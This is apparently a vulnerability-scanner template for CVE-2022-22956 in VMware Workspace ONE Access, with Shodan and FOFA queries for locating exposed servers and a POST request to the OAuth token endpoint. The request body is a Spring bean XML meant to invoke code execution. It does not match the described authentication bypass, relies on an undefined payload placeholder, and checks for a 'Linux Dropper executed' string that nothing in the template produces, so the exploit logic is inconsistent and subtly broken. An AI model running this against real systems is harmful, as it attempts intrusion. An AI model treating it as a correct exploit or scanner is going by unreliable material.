id: CVE-2022-22956

info:
  name: VMware Workspace ONE Access Authentication Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: VMware Workspace ONE Access has two authentication bypass vulnerabilities (CVE-2022-22955 & CVE-2022-22956) in the OAuth2 ACS framework allowing unauthorized actions.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the necessary patch provided by VMware to mitigate the vulnerability (CVE-2022-22956).
  reference:
    - http://packetstormsecurity.com/files/171918/Mware-Workspace-ONE-Remote-Code-Execution.html
    - https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution
    - https://github.com/sourceincite/hekate/
    - https://www.vmware.com/security/advisories/VMSA-2022-0011.html
    - http://packetstormsecurity.com/files/171918/VMware-Workspace-ONE-Remote-Code-Execution.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22956
    cwe-id: CWE-287
    epss-score: 0.00265
    epss-percentile: 0.66503
    cpe: cpe:2.3:a:vmware:identity_manager:3.3.3:*:*:*:*:*:*:*
  metadata:
    vendor: vmware
    product: identity_manager
    shodan-query: http.favicon.hash:-1250474341
    fofa-query: app="vmware-Workspace-ONE-Access" || app="vmware-Identity-Manager" || app="vmware-vRealize"
  tags: packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/SAAS/API/1.0/REST/auth/oauthtoken?grant_type=client_credentials"

    headers:
      Content-Type: "application/xml"

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <beans xmlns="http://www.springframework.org/schema/beans"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.springframework.org/schema/beans
      http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
          <property name="targetObject" value="#{payload}"/>
          <property name="targetMethod" value="start"/>
        </bean>
      </beans>
    matchers:
      - type: word
        words:
          - "Linux Dropper executed"
        part: body
